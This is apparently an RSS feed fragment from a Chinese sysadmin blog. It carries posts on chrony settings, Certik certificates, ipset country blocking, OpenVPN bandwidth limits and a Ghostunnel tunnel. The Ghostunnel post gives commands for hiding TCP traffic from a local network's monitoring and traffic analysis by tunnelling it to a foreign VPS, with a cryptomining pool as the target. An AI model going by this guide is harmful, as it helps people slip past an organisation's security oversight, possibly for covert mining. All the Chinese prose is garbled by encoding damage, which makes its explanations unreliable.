&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# if its offset is larger than 1 second.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;makestep 1.0 3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Enable kernel synchronization of the real-time clock (RTC).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rtcsync&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Enable hardware timestamping on all interfaces that support it.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#hwtimestamp *&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Increase the minimum number of selectable sources required to adjust&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# the system clock.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#minsources 2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Allow NTP client access from local network.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#allow 192.168.0.0/16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Serve time even if not synchronized to a time source.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#local stratum 10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Specify file containing keys for NTP authentication.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#keyfile /etc/chrony.keys&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Specify directory for log files.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;logdir /var/log/chrony&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;logchange 0.5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Select which information is logged.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#log measurements statistics tracking rtc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡Œé¢æœ‰å¥½å‡ ä¸ªç»†èŠ‚ï¼Œä¸‹é¢é€ä¸€è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>ghostunnelä½¿ç”¨TLSåŠ å¯†TCPæµé‡</title>
      <link>https://rendoumi.com/posts/20211019-ghostunnel/</link>
      <pubDate>Tue, 19 Oct 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211019-ghostunnel/</guid>
      <description>&lt;p&gt;å¾ˆç°å®çš„é—®é¢˜ï¼Œå±€åŸŸç½‘å†…æœ‰æ€åŠ¿æ„ŸçŸ¥å’Œç½‘ç»œæµé‡åˆ†æï¼Œè¿™å¾ˆè®¨åŒï¼&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆï¼Œå¦‚ä½•æŠŠæŸæ®µæµé‡éšè—èµ·æ¥ï¼Œè®©æ€åŠ¿æ„ŸçŸ¥æ— æ³•åˆ†æå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;å‰ææ¡ä»¶ï¼Œä½ éœ€è¦æœ‰å›½å¤–çš„ä¸€å° VPS ä½œä¸ºå¤–æ´ï¼ŒæŠŠ TCP æµé‡é€šè¿‡ TLS åŠ å¯†é€åˆ°å›½å¤–çš„æœåŠ¡å™¨ï¼Œç„¶åå†è½¬å‘åˆ°æ­£ç¡®çš„ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·å°±ä¸ä¼šè¢«äººè¿½è¸ªäº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæ¨è Ghostunnel  ï¼Œè¿™æ˜¯ä¸ª Go çš„ç¨‹åºï¼Œåªæœ‰ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ã€‚é…åˆ certik è¯ä¹¦ç”Ÿæˆï¼Œå°±å®Œç¾äº†ã€‚&lt;/p&gt;
&lt;p&gt;é¡¹ç›®åœ°å€ï¼šhttps://github.com/ghostunnel/ghostunnel&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ certik ç”Ÿæˆä¸‰ä¸ªè¯ä¹¦ï¼Œca.pem server.pem å’Œ client1.pem&lt;/p&gt;
&lt;p&gt;ç„¶åghostunnelä»¥åŠä¸‰ä¸ªè¯ä¹¦æ–‡ä»¶éƒ½æ”¾åœ¨/usr/local/binä¸‹&lt;/p&gt;
&lt;h2 id=&#34;ä¸€åœ¨vpsä¸Šè¿è¡Œghostunnelæ¨¡å¼server&#34;&gt;ä¸€ã€åœ¨VPSä¸Šè¿è¡Œghostunnelæ¨¡å¼server&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/local/bin/ghostunnel server --listen 0.0.0.0:9999 --target tr.dero.herominers.com:1117 --keystore server.pem --cacert ca.pem --allow-cn client1 --unsafe-target
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢ç›‘å¬äº†ç«¯å£0.0.0.0:9999ï¼ˆç›‘å¬0.0.0.0å¿…é¡»åŠ å‚æ•°&amp;ndash;unsafe-targetï¼‰ï¼Œè¿œç¨‹è½¬å‘åˆ°deroçš„çŸ¿æ± ç«¯å£1117ï¼Œåªå…è®¸éªŒè¯è¿‡çš„cn client1è¿æ¥ã€‚&lt;/p&gt;
&lt;h2 id=&#34;äºŒåœ¨æœ¬åœ°æœºå™¨ä¸Šè¿è¡Œghostunnelæ¨¡å¼client&#34;&gt;äºŒã€åœ¨æœ¬åœ°æœºå™¨ä¸Šè¿è¡Œghostunnelæ¨¡å¼client&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/local/bin/ghostunnel client --listen localhost:9999 --target 193.42.114.129:9999 --keystore client.pem --cacert ca.pem 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ¬åœ°ç›‘å¬localhost:9999ï¼Œæ‰€ä»¥ä¸ç”¨åŠ &amp;ndash;unsafe-targetå‚æ•°ï¼Œç„¶åè¿æ¥åˆ°è¿œç¨‹ vps æœåŠ¡å™¨ï¼Œipåœ°å€æ˜¯193.42.114.129ï¼Œç«¯å£æ˜¯9999&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°±å®Œæˆäº†ã€‚å¯ä»¥æ”¾å¿ƒçš„å¯åŠ¨ç¨‹åºï¼Œè¿æ¥åˆ°æœ¬åœ°ç«¯å£localhost:9999ï¼ŒTCPæµé‡å°±ä¼šè¢«éšè—èµ·æ¥ï¼Œä¸ä¼šè¢«åˆ†æåˆ°.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Certik è¯ä¹¦ç­¾å‘è½¯ä»¶</title>
      <link>https://rendoumi.com/posts/20211019-certik/</link>
      <pubDate>Tue, 19 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211019-certik/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬ä¼šæœ‰å¾ˆå¤šæ—¶å€™éœ€è¦ç”¨åˆ°TLSè¯ä¹¦ï¼Œä¸€ä¸ªéå¸¸æ–¹ä¾¿ã€å°ä¼—çš„å·¥å…·å°±æ˜¯ certik ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªè½¯ä»¶çº¯ç”± Go ç»„æˆï¼Œå°±ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨äº† etcd çš„ boltdb æ ¼å¼å­˜æ”¾æ‰€æœ‰çš„è¯ä¹¦ã€‚&lt;/p&gt;
&lt;p&gt;è½¯ä»¶åœ°å€ï¼šhttps://github.com/opencoff/certik&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€åˆå§‹åŒ–è¯ä¹¦åº“&#34;&gt;ä¸€ã€åˆå§‹åŒ–è¯ä¹¦åº“&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./certik -v tls.db init CA
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒç­¾å‘ä¸€å¼ serverè¯ä¹¦&#34;&gt;äºŒã€ç­¾å‘ä¸€å¼ serverè¯ä¹¦&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#./certik -v tls.db server -i IP.ADDR.ES server.domain.name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./certik -v tls.db server -i 193.42.114.129 server
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢æˆ‘ä»¬ server çš„ ip æ˜¯193.42.114.129ï¼ŒåŸŸåç®€æ´èµ·è§å°±å« server äº† ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸‰ç­¾å‘ä¸€å¼ client1è¯ä¹¦&#34;&gt;ä¸‰ã€ç­¾å‘ä¸€å¼ client1è¯ä¹¦&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./certik -v tls.db client client1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å››æŸ¥çœ‹è¯ä¹¦åº“&#34;&gt;å››ã€æŸ¥çœ‹è¯ä¹¦åº“&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./certik -v tls.db list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªè¯ä¹¦äº†ï¼Œä¸€ä¸ª CA ï¼Œä¸€ä¸ª server ï¼Œä¸€ä¸ª client1&lt;/p&gt;
&lt;h2 id=&#34;äº”å¯¼å‡ºå„ä¸ªè¯ä¹¦&#34;&gt;äº”ã€å¯¼å‡ºå„ä¸ªè¯ä¹¦&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å¯¼å‡ºCA&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./certik -v tls.db &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; --root-ca
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å¯¼å‡ºserver&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./certik -v tls.db &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å¯¼å‡ºclient1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./certik -v tls.db &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; client1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»¥ä¸Šå°±å¯ä»¥å¾—åˆ°å„ä¸ªä¸œè¥¿äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä½¿ç”¨IPSETå°æ‰æŸä¸ªå›½å®¶æ•´ä¸ªçš„è®¿é—®</title>
      <link>https://rendoumi.com/posts/20211018-ipset_block_cn/</link>
      <pubDate>Mon, 18 Oct 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211018-ipset_block_cn/</guid>
      <description>&lt;p&gt;ç°åœ¨å›½å†…éƒ½ç¦æ­¢æŒ–å¸ï¼Œä»€ä¹ˆå¸å®‰ã€ç«å¸ã€cnsparkä¹‹ç±»çš„éƒ½ä¸å…è®¸å›½å†… IP è®¿é—®äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;é¦–å…ˆéœ€è¦å¾—åˆ°å›½å®¶&lt;code&gt;IP&lt;/code&gt;æ®µï¼Œä¸‹è½½åœ°å€ï¼šhttp://www.ipdeny.com/ipblocks/ã€‚è¿™é‡Œä»¥æˆ‘ä»¬å›½å®¶ cn ä¸ºä¾‹&lt;/p&gt;
&lt;p&gt;æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…ipset&#34;&gt;ä¸€ã€å®‰è£…ipset&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Debian/Ubuntuç³»ç»Ÿ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get -y install ipset
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#CentOSç³»ç»Ÿ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install ipset
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒæ¸…ç©ºiptableè§„åˆ™&#34;&gt;äºŒã€æ¸…ç©ºiptableè§„åˆ™&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#é˜²æ­¢è®¾ç½®ä¸ç”Ÿæ•ˆï¼Œæ¸…ç©ºä¹‹å‰çš„é˜²ç«å¢™è§„åˆ™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -P INPUT ACCEPT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -F
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ä¸‰åˆ›å»ºipsetè§„åˆ™é›†&#34;&gt;ä¸‰ã€åˆ›å»ºipsetè§„åˆ™é›†&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ›å»ºä¸€ä¸ªåä¸ºcnipçš„è§„åˆ™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipset -N cnip hash:net
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#ä¸‹è½½å›½å®¶IPæ®µï¼Œè¿™é‡Œä»¥ä¸­å›½ä¸ºä¾‹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget -P . http://www.ipdeny.com/ipblocks/data/countries/cn.zone
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å°†IPæ®µæ·»åŠ åˆ°cnipè§„åˆ™é›†ä¸­&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;cat /root/cn.zone &lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; ipset -A cnip &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å››åˆ›å»ºiptableé»‘åå•&#34;&gt;å››ã€åˆ›å»ºiptableé»‘åå•&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ‰”é»‘åå•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -A INPUT -p tcp --dport &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; -m &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; --match-set cnip src -j DROP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -A INPUT -p tcp --dport &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt; -m &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; --match-set cnip src -j DROP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#ç„¶åæ”¾è¡Œå…¶ä»–çš„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -P INPUT ACCEPT
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>OpenVPN é™åˆ¶æµé‡å¸¦å®½</title>
      <link>https://rendoumi.com/posts/20211018-openvpn_limit_bandwidth/</link>
      <pubDate>Mon, 18 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211018-openvpn_limit_bandwidth/</guid>
      <description>&lt;p&gt;å…¬å¸å®‰è£…äº† openvpn ï¼Œå¸¦æ¥æ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿæœ‰å¾ˆå¤šä¸ä¾¿çš„åœ°æ–¹ï¼Œæœºæˆ¿çš„æ€»å¸¦å®½å°±é‚£ä¹ˆå¤šã€‚&lt;/p&gt;
&lt;p&gt;å¾ˆå¤šäººå…±ç”¨ vpn çš„æ—¶å€™ï¼Œå°±ä¼šæŠ¢å å¸¦å®½ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆï¼Œæˆ‘ä»¬éœ€è¦é™åˆ¶ä¸€ä¸‹ï¼Œé™åˆ¶ openvpn æ‰€èƒ½ä½¿ç”¨çš„å¸¦å®½ï¼Œé¿å…æŠ¢å  WEB çš„å¸¦å®½&lt;/p&gt;
&lt;p&gt;åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ç”±äºæˆ‘ä»¬ä¸æ˜¯è¦å•ç‹¬é™åˆ¶æŸä¸€ä¸ª openvpn ç”¨æˆ·ï¼Œè€Œæ˜¯é™åˆ¶æ•´ä½“ï¼Œæ‰€ä»¥ç®€å•ç”¨ TC å°±å¯ä»¥äº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;tc qdisc del dev tun0 root  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tc qdisc add dev tun0 root handle 1: htb default &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tc class add dev tun0 parent 1: classid 1:1 htb rate 30Mbit ceil 30Mbit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æˆ‘ä»¬ openvpn å¯çš„æ˜¯ tun0 ï¼Œæ‰€ä»¥é™åˆ¶çš„å¯¹è±¡å°±æ˜¯ dev tun0&lt;/li&gt;
&lt;li&gt;é¦–å…ˆç¬¬ä¸€è¡Œæ¸…é™¤ tun0 çš„æ ¹é˜Ÿåˆ—&lt;/li&gt;
&lt;li&gt;ç„¶åç¬¬äºŒè¡Œå»ºç«‹ tun0 çš„ root æ ¹é˜Ÿåˆ—ä¸º 1:0 htb ï¼Œç¼ºçœæ˜¯1:1çš„å­é˜Ÿåˆ—&lt;/li&gt;
&lt;li&gt;æœ€åä¸€è¡Œï¼Œç¬¬ä¸‰è¡Œå»ºç«‹ 1:1 çš„å­é˜Ÿåˆ—ï¼Œå¸¦å®½é™åˆ¶æ˜¯ 30Mbit ï¼Œæ³¨æ„è¿™é‡Œæ˜¯å¤§Bï¼Œå°±æ˜¯ç½‘ç»œæœ¯è¯­ä¸­çš„å¸¦å®½ï¼Œæ¢ç®—æˆå°bçš„è¯ï¼Œéœ€è¦é™¤ä»¥8&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ•ˆæœå¾ˆæ˜æ˜¾ï¼Œç›´æ¥è¢«é™åˆ¶ä½ï¼ˆ41å…†è€Œä¸æ˜¯30Mæ˜¯å› ä¸ºè¿™å°æœºå™¨æ˜¯è™šæœºï¼Œå®ä½“æœºä¸Šè¿˜æœ‰åˆ«çš„æµé‡ï¼‰ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>æœ¬ç«™åšå®¢çš„ç”±æ¥ä»¥åŠæ­å»ºä½¿ç”¨æ•™ç¨‹</title>
      <link>https://rendoumi.com/posts/20211015-hugo_blog/</link>
      <pubDate>Fri, 15 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211015-hugo_blog/</guid>
      <description>&lt;p&gt;æœ¬ç«™è¿™ä¸ªåšå®¢çš„ç”±æ¥ï¼š&lt;/p&gt;
